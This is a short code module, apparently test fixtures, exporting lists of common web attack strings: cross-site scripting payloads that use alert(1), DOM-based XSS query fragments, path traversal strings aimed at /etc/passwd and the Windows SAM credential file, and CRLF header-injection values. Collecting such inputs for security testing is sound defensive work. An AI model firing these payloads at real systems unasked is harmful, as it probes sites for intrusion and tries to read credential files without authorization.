// Common XSS attack payloads
export const xssPayloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '"><script>alert(1)</script>',
  "'-alert(1)-'",
  '<img src="x" onerror="alert(1)">',
  'javascript:alert(1)',
  '<body onload=alert(1)>',
  '<iframe src="javascript:alert(1)">',
  '{{constructor.constructor("alert(1)")()}}',
  '${alert(1)}',
  '<div onmouseover="alert(1)">hover</div>',
];

// DOM-based XSS test patterns
export const domXssPayloads = [
  '#<script>alert(1)</script>',
  '?search=<script>alert(1)</script>',
  '?q="><img src=x onerror=alert(1)>',
  '#"><svg onload=alert(1)>',
];

// URL-based injection payloads
export const urlPayloads = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '%00',
  '%0d%0a',
];

// Header injection payloads
export const headerPayloads = [
  'test\r\nX-Injected: header',
  'test%0d%0aX-Injected:%20header',
];
